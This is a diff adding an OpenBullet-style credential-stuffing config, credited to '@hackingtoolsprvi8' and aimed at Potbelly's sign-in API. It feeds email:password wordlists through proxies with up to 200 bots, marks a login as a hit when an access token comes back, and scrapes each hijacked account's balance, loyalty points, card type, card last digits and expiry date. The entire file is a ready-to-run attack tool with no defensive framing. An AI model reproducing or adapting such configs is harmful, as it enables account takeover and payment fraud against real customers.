@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "Potbelly(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-05T21:45:48.2682066+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.prod.potbelly.com/v1/signin" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"basketid\":null}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,ro-RO;q=0.8,ro;q=0.7" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://www.potbelly.com" 
+  HEADER "referer: https://www.potbelly.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "PaytronixAccessToken" 
+  KEYCHAIN Failure OR 
+    KEY "could_not_authenticate" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "BillingAccounts\":[]" 
+
+PARSE "<SOURCE>" JSON "AccountBalance" CreateEmpty=FALSE -> CAP "Balance" "$" "" 
+
+PARSE "<SOURCE>" JSON "PointBalance" CreateEmpty=FALSE -> CAP "Points" 
+
+PARSE "<SOURCE>" JSON "cardtype" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card Type" 
+
+PARSE "<SOURCE>" JSON "cardsuffix" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card" "XXXX-XXXX-XXXX-" "" 
+
+PARSE "<SOURCE>" JSON "expiration" Recursive=TRUE CreateEmpty=FALSE -> CAP "Expiration Date" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
